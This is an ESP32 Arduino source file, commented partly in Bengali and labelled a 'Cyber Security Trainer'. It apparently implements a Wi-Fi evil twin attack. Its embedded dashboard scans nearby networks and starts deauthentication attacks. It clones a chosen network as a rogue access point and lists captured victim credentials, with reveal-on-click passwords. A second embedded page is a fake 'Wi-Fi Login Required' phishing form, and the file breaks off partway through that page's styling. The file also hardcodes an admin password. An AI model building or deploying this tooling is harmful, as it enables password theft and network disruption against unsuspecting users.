#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <ArduinoJson.h>

// ========== সার্ভার ডিক্লারেশন ==========
WebServer server(80);
DNSServer dnsServer;

// ========== Admin AP সেটিংস ==========
const char* adminSSID = "Unknown";
const char* adminPassword = "Rabbi0606@";

// ========== Evil Twin সেটিংস ==========
bool isEvilTwinActive = false;
String evilTwinSSID = "Free_WiFi";
int evilTwinChannel = 6;

// ========== নেটওয়ার্ক স্ক্যান (সিম্পল) ==========
String networkSSIDs[30];
int networkChannels[30];
int networkRSSI[30];
int networkCount = 0;

// ========== ক্রেডেনশিয়াল স্টোরেজ (অপ্টিমাইজড) ==========
struct Credential {
    String timestamp;
    String ssid;
    String password;
    String clientIP;
};
Credential capturedCreds[50];
int credCount = 0;

// ========== ফাংশন ডিক্লারেশন ==========
String getTimestamp();
void scanNetworks();
void createEvilTwinAP(String ssid, int channel);
void setupServer();

// ========== ইউটিলিটি ফাংশন ==========
String getTimestamp() {
    unsigned long ms = millis();
    int seconds = (ms / 1000) % 60;
    int minutes = (ms / (1000 * 60)) % 60;
    int hours = (ms / (1000 * 60 * 60)) % 24;
    
    char buffer[20];
    sprintf(buffer, "%02d:%02d:%02d", hours, minutes, seconds);
    return String(buffer);
}

// ========== HTML টেম্পলেটস ==========

// Admin Dashboard HTML (Simplified)
const char* adminDashboard = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Evil Twin Trainer - ESP32</title>
    <style>
        :root {
            --primary: #6366f1;
            --primary-dark: #4f46e5;
            --secondary: #8b5cf6;
            --danger: #ef4444;
            --danger-dark: #dc2626;
            --success: #10b981;
            --success-dark: #059669;
            --warning: #f59e0b;
            --warning-dark: #d97706;
            --dark: #1e293b;
            --light: #f8fafc;
            --gray: #64748b;
            --border: #e2e8f0;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
            background-size: 200% 200%;
            animation: gradientShift 15s ease infinite;
            min-height: 100vh;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
        
        @keyframes gradientShift {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            padding: 30px;
            border-radius: 20px;
            margin-bottom: 25px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.3);
            text-align: center;
            position: relative;
            overflow: hidden;
        }
        
        header::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            animation: shimmer 3s infinite;
        }
        
        @keyframes shimmer {
            0% { left: -100%; }
            100% { left: 100%; }
        }
        
        h1 {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-size: 2.5rem;
            font-weight: 800;
            margin-bottom: 15px;
            letter-spacing: -0.5px;
            position: relative;
            z-index: 1;
        }
        
        .status-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            padding: 10px 24px;
            background: linear-gradient(135deg, var(--success), var(--success-dark));
            color: white;
            border-radius: 30px;
            font-size: 14px;
            font-weight: 600;
            box-shadow: 0 4px 15px rgba(16, 185, 129, 0.3);
            position: relative;
            z-index: 1;
            transition: all 0.3s ease;
        }
        
        .status-badge::before {
            content: '';
            width: 8px;
            height: 8px;
            background: white;
            border-radius: 50%;
            animation: pulse 2s ease-in-out infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(0.8); }
        }
        
        .status-badge:hover {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
        }
        
        .dashboard {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 20px;
        }
        
        @media (max-width: 768px) {
            .dashboard {
                grid-template-columns: 1fr;
            }
        }
        
        .card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            padding: 30px;
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.3);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
        }
        
        .card:hover {
            transform: translateY(-5px);
            box-shadow: 0 12px 40px rgba(0, 0, 0, 0.15);
        }
        
        .card h2 {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-size: 1.5rem;
            font-weight: 700;
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 3px solid transparent;
            border-image: linear-gradient(90deg, var(--primary), var(--secondary), transparent) 1;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .btn {
            padding: 12px 28px;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            margin: 6px;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            width: 0;
            height: 0;
            border-radius: 50%;
            background: rgba(255, 255, 255, 0.3);
            transform: translate(-50%, -50%);
            transition: width 0.6s, height 0.6s;
        }
        
        .btn:hover::before {
            width: 300px;
            height: 300px;
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
            color: white;
        }
        
        .btn-primary:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(99, 102, 241, 0.4);
        }
        
        .btn-danger {
            background: linear-gradient(135deg, var(--danger), var(--danger-dark));
            color: white;
        }
        
        .btn-danger:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(239, 68, 68, 0.4);
        }
        
        .btn-success {
            background: linear-gradient(135deg, var(--success), var(--success-dark));
            color: white;
        }
        
        .btn-success:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(16, 185, 129, 0.4);
        }
        
        .btn-warning {
            background: linear-gradient(135deg, var(--warning), var(--warning-dark));
            color: white;
        }
        
        .btn-warning:hover:not(:disabled) {
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(245, 158, 11, 0.4);
        }
        
        .network-list {
            max-height: 420px;
            overflow-y: auto;
            margin-top: 20px;
            padding-right: 10px;
        }
        
        .network-list::-webkit-scrollbar {
            width: 8px;
        }
        
        .network-list::-webkit-scrollbar-track {
            background: #f1f5f9;
            border-radius: 10px;
        }
        
        .network-list::-webkit-scrollbar-thumb {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            border-radius: 10px;
        }
        
        .network-list::-webkit-scrollbar-thumb:hover {
            background: linear-gradient(135deg, var(--primary-dark), var(--secondary));
        }
        
        .network-item {
            padding: 18px;
            margin: 10px 0;
            background: linear-gradient(135deg, #ffffff, #f8fafc);
            border-radius: 12px;
            border-left: 4px solid var(--primary);
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
            position: relative;
            overflow: hidden;
        }
        
        .network-item::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 4px;
            height: 100%;
            background: linear-gradient(180deg, var(--primary), var(--secondary));
            transition: width 0.3s ease;
        }
        
        .network-item:hover {
            background: linear-gradient(135deg, #f8fafc, #f1f5f9);
            transform: translateX(5px);
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
        }
        
        .network-item:hover::before {
            width: 6px;
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 15px;
            margin-top: 20px;
        }
        
        .stat-box {
            background: linear-gradient(135deg, #ffffff, #f8fafc);
            padding: 25px 20px;
            border-radius: 15px;
            text-align: center;
            transition: all 0.3s ease;
            border: 2px solid rgba(99, 102, 241, 0.1);
            position: relative;
            overflow: hidden;
        }
        
        .stat-box::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 3px;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
        }
        
        .stat-box:hover {
            transform: translateY(-5px);
            box-shadow: 0 8px 20px rgba(99, 102, 241, 0.2);
            border-color: rgba(99, 102, 241, 0.3);
        }
        
        .stat-value {
            font-size: 36px;
            font-weight: 800;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 8px;
        }
        
        .stat-label {
            font-size: 13px;
            color: var(--gray);
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }
        
        .tab-container {
            background: white;
            border-radius: 15px;
            padding: 25px;
            margin-top: 20px;
        }
        
        .tabs {
            display: flex;
            border-bottom: 2px solid #ddd;
            margin-bottom: 20px;
        }
        
        .tab {
            padding: 15px 25px;
            background: none;
            border: none;
            cursor: pointer;
            font-weight: 600;
            color: #666;
        }
        
        .tab.active {
            color: var(--primary);
            border-bottom: 3px solid var(--primary);
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-control {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid var(--border);
            border-radius: 12px;
            font-size: 15px;
            transition: all 0.3s ease;
            background: white;
            font-family: inherit;
        }
        
        .form-control:focus {
            outline: none;
            border-color: var(--primary);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
        }
        
        .form-control:read-only {
            background: #f8fafc;
            cursor: not-allowed;
        }
        
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--primary);
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .scanning-text {
            text-align: center;
            color: var(--primary);
            font-weight: bold;
            margin-top: 10px;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        
        .network-item.selected {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: white;
            border-left: 4px solid white;
            box-shadow: 0 6px 25px rgba(99, 102, 241, 0.4);
            transform: translateX(5px) scale(1.02);
        }
        
        .network-item.selected::before {
            width: 100%;
            opacity: 0.2;
            background: white;
        }
        
        .network-item.selected small {
            color: rgba(255, 255, 255, 0.9);
        }
        
        .signal-strength {
            display: inline-block;
            margin-left: 10px;
        }
        
        .signal-bar {
            display: inline-block;
            width: 3px;
            height: 12px;
            background: #ddd;
            margin: 0 1px;
            border-radius: 2px;
        }
        
        .signal-bar.active {
            background: #28a745;
        }
        
        /* Toast Notifications */
        .toast {
            position: fixed;
            top: 20px;
            right: 20px;
            background: white;
            padding: 18px 24px;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
            display: flex;
            align-items: center;
            gap: 12px;
            z-index: 10000;
            animation: slideIn 0.4s cubic-bezier(0.68, -0.55, 0.265, 1.55);
            border-left: 4px solid var(--success);
            max-width: 350px;
        }
        
        .toast.success { border-left-color: var(--success); }
        .toast.error { border-left-color: var(--danger); }
        .toast.warning { border-left-color: var(--warning); }
        .toast.info { border-left-color: var(--primary); }
        
        @keyframes slideIn {
            from {
                transform: translateX(400px);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        
        @keyframes slideOut {
            from {
                transform: translateX(0);
                opacity: 1;
            }
            to {
                transform: translateX(400px);
                opacity: 0;
            }
        }
        
        .toast.hide {
            animation: slideOut 0.3s ease forwards;
        }
        
        .toast-icon {
            font-size: 24px;
            flex-shrink: 0;
        }
        
        .toast-message {
            flex: 1;
            font-weight: 500;
            color: #333;
        }
        
        .toast-close {
            cursor: pointer;
            font-size: 20px;
            color: #999;
            background: none;
            border: none;
            padding: 0;
            width: 24px;
            height: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            transition: all 0.2s;
        }
        
        .toast-close:hover {
            background: #f0f0f0;
            color: #333;
        }
        
        /* Progress Bar */
        .progress-container {
            width: 100%;
            height: 8px;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 10px;
            overflow: hidden;
            margin: 15px 0;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, var(--primary), var(--secondary));
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 10px;
            position: relative;
            overflow: hidden;
        }
        
        .progress-bar::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
            animation: shimmer 2s infinite;
        }
        
        /* Table Enhancements */
        table {
            border-radius: 12px;
            overflow: hidden;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
        }
        
        table thead tr {
            background: linear-gradient(135deg, var(--primary), var(--secondary)) !important;
        }
        
        table tbody tr {
            border-bottom: 1px solid var(--border);
            transition: all 0.2s ease;
        }
        
        table tbody tr:hover {
            background: rgba(99, 102, 241, 0.05);
            transform: scale(1.01);
        }
        
        table td {
            padding: 12px;
            font-size: 14px;
        }
        
        /* Alert Boxes */
        .alert-box {
            padding: 18px 24px;
            border-radius: 12px;
            margin: 15px 0;
            display: flex;
            align-items: center;
            gap: 12px;
            animation: fadeIn 0.4s ease;
            border-left: 5px solid;
        }
        
        .alert-box.success {
            background: #d4edda;
            border-left-color: var(--success);
            color: #155724;
        }
        
        .alert-box.danger {
            background: #ffebee;
            border-left-color: var(--danger);
            color: #c62828;
        }
        
        .alert-box.warning {
            background: #fff3cd;
            border-left-color: var(--warning);
            color: #856404;
        }
        
        .alert-box.info {
            background: #e3f2fd;
            border-left-color: var(--primary);
            color: #1565c0;
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
                transform: translateY(-10px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }
        
        /* Improved Tab Design */
        .tabs {
            display: flex;
            border-bottom: none;
            margin-bottom: 20px;
            background: var(--light);
            padding: 6px;
            border-radius: 12px;
            gap: 6px;
        }
        
        .tab {
            padding: 12px 24px;
            background: transparent;
            border: none;
            cursor: pointer;
            font-weight: 600;
            color: #666;
            border-radius: 8px;
            transition: all 0.3s ease;
            position: relative;
        }
        
        .tab:hover {
            background: rgba(99, 102, 241, 0.1);
            color: var(--primary);
        }
        
        .tab.active {
            background: white;
            color: var(--primary);
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
        }
        
        /* Loading Spinner Enhancement */
        .loader {
            border: 4px solid rgba(99, 102, 241, 0.1);
            border-top: 4px solid var(--primary);
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 0.8s cubic-bezier(0.68, -0.55, 0.265, 1.55) infinite;
            margin: 20px auto;
        }
        
        /* Count Up Animation */
        @keyframes countUp {
            0% { opacity: 0; transform: translateY(20px) scale(0.8); }
            50% { transform: translateY(-5px) scale(1.1); }
            100% { opacity: 1; transform: translateY(0) scale(1); }
        }
        
        .stat-value.updated {
            animation: countUp 0.5s ease;
        }
        
        @media (max-width: 768px) {
            body {
                padding: 10px;
            }
            
            .card {
                padding: 15px;
            }
            
            .btn {
                padding: 10px 15px;
                font-size: 14px;
                margin: 3px;
            }
            
            h1 {
                font-size: 20px;
            }
            
            .stats {
                grid-template-columns: 1fr 1fr;
            }
            
            .stat-value {
                font-size: 24px;
            }
            
            .toast {
                right: 10px;
                left: 10px;
                max-width: none;
            }
            
            .tabs {
                flex-direction: column;
            }
            
            .tab {
                text-align: center;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🔐 PlatformIO Cyber Security Trainer</h1>
            <div class="status-badge" id="systemStatus">সিস্টেম প্রস্তুত</div>
        </header>
        
        <div class="dashboard">
            <div class="card">
                <h2>📶 Wi-Fi Network Scanner</h2>
                <button class="btn btn-primary" id="scanBtn" onclick="scanNetworks()">
                    🔍 Scan Networks
                </button>
                <div class="network-list" id="networkList">
                    <!-- Networks will appear here -->
                </div>
            </div>
            
            <div class="card">
                <h2>🎯 Training Controls</h2>
                
                <div class="form-group">
                    <label>Target Network:</label>
                    <input type="text" class="form-control" id="targetNetwork" readonly>
                </div>
                
                <div class="stats">
                    <div class="stat-box">
                        <div class="stat-value" id="deauthCount">0</div>
                        <div class="stat-label">Deauth Packets</div>
                    </div>
                    <div class="stat-box">
                        <div class="stat-value" id="credCount">0</div>
                        <div class="stat-label">Credentials</div>
                    </div>
                </div>
                
                <div style="text-align: center; margin-top: 20px;">
                    <button class="btn btn-danger" id="btnDeauth" onclick="startDeauth()" disabled>
                        ⚡ Start Deauth
                    </button>
                    <button class="btn btn-warning" id="btnEvilTwin" onclick="createEvilTwin()" disabled>
                        👥 Create Evil Twin
                    </button>
                    <button class="btn btn-success" onclick="stopAll()">
                        ⏹️ Stop All
                    </button>
                </div>
                
                <div id="attackStatus" style="margin-top: 20px;"></div>
            </div>
        </div>
        
        <div class="tab-container">
            <div class="tabs">
                <button class="tab active" onclick="openTab('credentials')">🔑 Credentials</button>
                <button class="tab" onclick="openTab('settings')">⚙️ Settings</button>
            </div>
            
            <div id="credentials" class="tab-content">
                <h2>Captured Credentials</h2>
                <table style="width:100%; border-collapse:collapse; margin-top:20px;">
                    <thead>
                        <tr style="background:var(--primary); color:white;">
                            <th style="padding:12px;">Time</th>
                            <th>Network</th>
                            <th>Username</th>
                            <th>Password</th>
                            <th>Client IP</th>
                        </tr>
                    </thead>
                    <tbody id="credTable">
                        <!-- Credentials will appear here -->
                    </tbody>
                </table>
            </div>
            
            <div id="settings" class="tab-content" style="display:none;">
                <h2>System Settings</h2>
                <div class="form-group">
                    <label>Evil Twin Password:</label>
                    <input type="text" class="form-control" id="evilPass" value="connect123">
                </div>
                <button class="btn btn-primary" onclick="saveSettings()">
                    Save Settings
                </button>
            </div>
        </div>
    </div>
    
    <script>
        let selectedNetwork = null;
        
        // Toast Notification System
        function showToast(message, type = 'success', duration = 3000) {
            const icons = {
                success: '✅',
                error: '❌',
                warning: '⚠️',
                info: 'ℹ️'
            };
            
            const toast = document.createElement('div');
            toast.className = `toast ${type}`;
            toast.innerHTML = `
                <span class="toast-icon">${icons[type]}</span>
                <span class="toast-message">${message}</span>
                <button class="toast-close" onclick="this.parentElement.remove()">×</button>
            `;
            
            document.body.appendChild(toast);
            
            setTimeout(() => {
                toast.classList.add('hide');
                setTimeout(() => toast.remove(), 300);
            }, duration);
        }
        
        // Progress Bar Helper
        function updateProgress(elementId, percent) {
            const bar = document.getElementById(elementId);
            if(bar) {
                bar.style.width = percent + '%';
            }
        }
        
        // Animate Counter
        function animateCounter(element, targetValue, duration = 500) {
            const startValue = parseInt(element.textContent) || 0;
            const increment = (targetValue - startValue) / (duration / 16);
            let currentValue = startValue;
            
            element.classList.add('updated');
            
            const timer = setInterval(() => {
                currentValue += increment;
                if ((increment > 0 && currentValue >= targetValue) || 
                    (increment < 0 && currentValue <= targetValue)) {
                    element.textContent = targetValue;
                    clearInterval(timer);
                    setTimeout(() => element.classList.remove('updated'), 500);
                } else {
                    element.textContent = Math.floor(currentValue);
                }
            }, 16);
        }
        
        function scanNetworks() {
            let list = document.getElementById('networkList');
            let scanBtn = document.getElementById('scanBtn');
            
            // লোডার দেখান
            list.innerHTML = '<div class="loader"></div><div class="scanning-text">🔍 Scanning networks...</div>';
            scanBtn.disabled = true;
            scanBtn.textContent = '⏳ Scanning...';
            
            fetch('/scan')
                .then(r => r.json())
                .then(data => {
                    list.innerHTML = '';
                    
                    if(data.networks.length === 0) {
                        list.innerHTML = '<div style="text-align:center;padding:20px;color:#999;">No networks found</div>';
                        showToast('No networks found', 'info');
                    } else {
                        data.networks.forEach((net, idx) => {
                            let div = document.createElement('div');
                            div.className = 'network-item';
                            div.setAttribute('data-bssid', net.bssid);
                            div.style.animationDelay = (idx * 0.05) + 's';
                            
                            // Signal strength indicator
                            let strength = Math.min(4, Math.max(0, Math.floor((net.rssi + 100) / 12.5)));
                            let bars = '';
                            for(let i = 0; i < 4; i++) {
                                bars += `<span class="signal-bar ${i < strength ? 'active' : ''}"></span>`;
                            }
                            
                            div.innerHTML = `
                                <strong>${net.ssid || 'Hidden Network'}</strong>
                                <span class="signal-strength">${bars}</span><br>
                                <small>📡 Ch: ${net.channel} | 📶 ${net.rssi} dBm | 🔐 ${net.bssid}</small>
                            `;
                            div.onclick = () => selectNetwork(net, div);
                            list.appendChild(div);
                        });
                        
                        showToast(`Found ${data.networks.length} networks`, 'success');
                    }
                    
                    scanBtn.disabled = false;
                    scanBtn.textContent = '🔍 Scan Networks';
                })
                .catch(err => {
                    list.innerHTML = '<div style="text-align:center;padding:20px;color:red;">❌ Scan failed</div>';
                    scanBtn.disabled = false;
                    scanBtn.textContent = '🔍 Scan Networks';
                    showToast('Network scan failed!', 'error');
                });
        }
        
        function selectNetwork(network, element) {
            selectedNetwork = network;
            
            // Remove previous selection
            document.querySelectorAll('.network-item').forEach(item => {
                item.classList.remove('selected');
            });
            
            // Add selection to clicked item
            if(element) element.classList.add('selected');
            
            document.getElementById('targetNetwork').value = network.ssid || 'Hidden Network';
            document.getElementById('btnDeauth').disabled = false;
            document.getElementById('btnEvilTwin').disabled = false;
            
            showToast(`Selected: ${network.ssid || 'Hidden Network'}`, 'info', 2000);
        }
        
        function startDeauth() {
            if(!selectedNetwork) {
                showToast('Please select a network first!', 'warning');
                return;
            }
            
            fetch(`/startDeauth?ssid=${encodeURIComponent(selectedNetwork.ssid)}&bssid=${encodeURIComponent(selectedNetwork.bssid)}&channel=${selectedNetwork.channel}`)
                .then(r => r.json())
                .then(data => {
                    if(data.success) {
                        document.getElementById('systemStatus').textContent = '🚨 Deauth Active';
                        document.getElementById('systemStatus').style.background = 'var(--danger)';
                        document.getElementById('btnDeauth').disabled = true;
                        
                        let status = document.getElementById('attackStatus');
                        status.innerHTML = `
                            <div class="alert-box danger">
                                <span style="font-size:30px;">💥</span>
                                <div style="flex:1;">
                                    <strong>Deauth Attack Active!</strong><br>
                                    <small>Target: ${selectedNetwork.ssid} | BSSID: ${selectedNetwork.bssid}</small>
                                    <div class="progress-container">
                                        <div class="progress-bar" id="deauthProgress" style="width: 100%;"></div>
                                    </div>
                                </div>
                            </div>
                            <button class="btn btn-danger" onclick="stopDeauth()" style="width:100%; margin-top:10px;">
                                ⏹️ Stop Deauth Attack
                            </button>
                        `;
                        
                        showToast('Deauth attack started!', 'success');
                        updateStats();
                    } else {
                        showToast('Failed to start deauth attack', 'error');
                    }
                })
                .catch(err => {
                    showToast('Deauth request failed', 'error');
                });
        }
        
        function createEvilTwin() {
            if(!selectedNetwork) {
                showToast('Please select a network first!', 'warning');
                return;
            }
            
            let password = document.getElementById('evilPass').value;
            
            fetch(`/createEvilTwin?ssid=${encodeURIComponent(selectedNetwork.ssid)}&password=${password}&channel=${selectedNetwork.channel}`)
                .then(r => r.json())
                .then(data => {
                    if(data.success) {
                        document.getElementById('systemStatus').textContent = '👥 Evil Twin Active';
                        document.getElementById('systemStatus').style.background = 'var(--warning)';
                        document.getElementById('btnEvilTwin').disabled = true;
                        
                        let status = document.getElementById('attackStatus');
                        status.innerHTML = `
                            <div class="alert-box warning">
                                <span style="font-size:30px;">👥</span>
                                <div style="flex:1;">
                                    <strong>Evil Twin Created!</strong><br>
                                    <small>
                                        SSID: <code>${selectedNetwork.ssid}</code> | Password: <code>${password}</code>
                                    </small>
                                    <div style="margin-top:10px; padding:10px; background:rgba(255,255,255,0.7); border-radius:8px;">
                                        ℹ️ <strong>Admin:</strong> <a href="http://192.168.4.1/admin" target="_blank" style="color:#667eea; font-weight:bold;">192.168.4.1/admin</a><br>
                                        🎯 <strong>Victim:</strong> <code>192.168.4.1</code> (shows login page)
                                    </div>
                                </div>
                            </div>
                            <button class="btn btn-warning" onclick="stopEvilTwin()" style="width:100%; margin-top:10px;">
                                ⏹️ Stop Evil Twin
                            </button>
                        `;
                        
                        showToast('Evil Twin AP created successfully!', 'success');
                    } else {
                        showToast('Failed to create Evil Twin', 'error');
                    }
                })
                .catch(err => {
                    showToast('Evil Twin request failed', 'error');
                });
        }
        
        function stopDeauth() {
            fetch('/stopDeauth').then(() => {
                document.getElementById('systemStatus').textContent = 'সিস্টেম প্রস্তুত';
                document.getElementById('systemStatus').style.background = 'var(--success)';
                document.getElementById('btnDeauth').disabled = false;
                document.getElementById('attackStatus').innerHTML = '';
                showToast('Deauth attack stopped', 'info');
            });
        }
        
        function stopEvilTwin() {
            fetch('/stopEvilTwin').then(() => {
                document.getElementById('systemStatus').textContent = 'সিস্টেম প্রস্তুত';
                document.getElementById('systemStatus').style.background = 'var(--success)';
                document.getElementById('btnEvilTwin').disabled = false;
                document.getElementById('attackStatus').innerHTML = '';
                showToast('Evil Twin stopped', 'info');
            });
        }
        
        function stopAll() {
            fetch('/stopAll').then(() => {
                document.getElementById('systemStatus').textContent = 'সিস্টেম প্রস্তুত';
                document.getElementById('systemStatus').style.background = 'var(--success)';
                document.getElementById('btnDeauth').disabled = false;
                document.getElementById('btnEvilTwin').disabled = false;
                document.getElementById('attackStatus').innerHTML = '';
                showToast('All attacks stopped', 'success');
            });
        }
        
        function openTab(tabName) {
            document.querySelectorAll('.tab-content').forEach(tab => tab.style.display = 'none');
            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
            
            document.getElementById(tabName).style.display = 'block';
            event.target.classList.add('active');
            
            if(tabName === 'credentials') {
                updateCredentials();
            }
        }
        
        function updateStats() {
            fetch('/getStats')
                .then(r => r.json())
                .then(data => {
                    // Animate counter updates
                    const deauthElement = document.getElementById('deauthCount');
                    const credElement = document.getElementById('credCount');
                    
                    animateCounter(deauthElement, data.deauthPackets);
                    animateCounter(credElement, data.credentials);
                    
                    if(data.deauthActive) {
                        setTimeout(updateStats, 1000);
                    }
                });
        }
        
        function updateCredentials() {
            fetch('/getCredentials')
                .then(r => r.json())
                .then(data => {
                    let tbody = document.getElementById('credTable');
                    tbody.innerHTML = '';
                    
                    if(data.length === 0) {
                        tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;padding:30px;color:#999;">📭 No credentials captured yet</td></tr>';
                        return;
                    }
                    
                    data.forEach((cred, idx) => {
                        let row = tbody.insertRow();
                        row.style.animationDelay = (idx * 0.05) + 's';
                        row.style.animation = 'fadeIn 0.4s ease forwards';
                        
                        row.insertCell(0).textContent = cred.timestamp;
                        row.insertCell(1).innerHTML = `<strong style="color:var(--primary);">${cred.ssid}</strong>`;
                        row.insertCell(2).textContent = cred.username || '-';
                        row.insertCell(3).innerHTML = `<code style="background:#f0f0f0; padding:4px 8px; border-radius:4px; cursor:pointer;" title="Click to reveal">••••••••</code>`;
                        row.insertCell(4).textContent = cred.clientIP;
                        
                        // Password reveal on click with animation
                        row.cells[3].onclick = function() {
                            const codeEl = this.querySelector('code');
                            if(codeEl.textContent === '••••••••') {
                                codeEl.textContent = cred.password;
                                codeEl.style.background = '#ffebee';
                                codeEl.style.color = '#c62828';
                                showToast('Password revealed!', 'warning', 1500);
                            } else {
                                codeEl.textContent = '••••••••';
                                codeEl.style.background = '#f0f0f0';
                                codeEl.style.color = '';
                            }
                        };
                    });
                });
        }
        
        function saveSettings() {
            showToast('Settings saved successfully!', 'success');
        }
        
        // Auto-update stats when attacks are running
        setInterval(() => {
            const status = document.getElementById('systemStatus').textContent;
            if(status !== 'সিস্টেম প্রস্তুত') {
                updateStats();
            }
        }, 2000);
        
        // Initialize on page load
        window.onload = function() {
            showToast('System ready! 🚀', 'info', 2000);
            scanNetworks();
        };
    </script>
</body>
</html>
)rawliteral";

// Evil Twin Login Page
const char* phishingPage = R"rawliteral(
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wi-Fi Login Required</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
        }
        .login-box {
            background: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 380px;
            text-align: center;
        }
        .wifi-icon {
            font-size: 70px;
            color: #667eea;
            margin-bottom: 20px;
        }
        h2 {
            color: #333;
            margin-bottom: 10px;
        }
        .network-name {
            color: #667eea;
            font-weight: bold;
            font-size: 20px;
            margin: 20px 0;
            padding: 15px;
            background: #f8f9fa;
            border-radius: 10px;
        }
        input {
            width: 100%;
            padding: 15px;
            margin: 12px 0;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
        }
        button {
            width: 100%;
            padding: 15px;
            background: #667eea;
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 15px;
        }
        .security-note {
            margin-top: 25px;
            padding: 20px;
            background: #fff3cd;
            border: 2px solid #ffc107;
            border-radius: 10px;
            color: #856404;
            text-align: left;
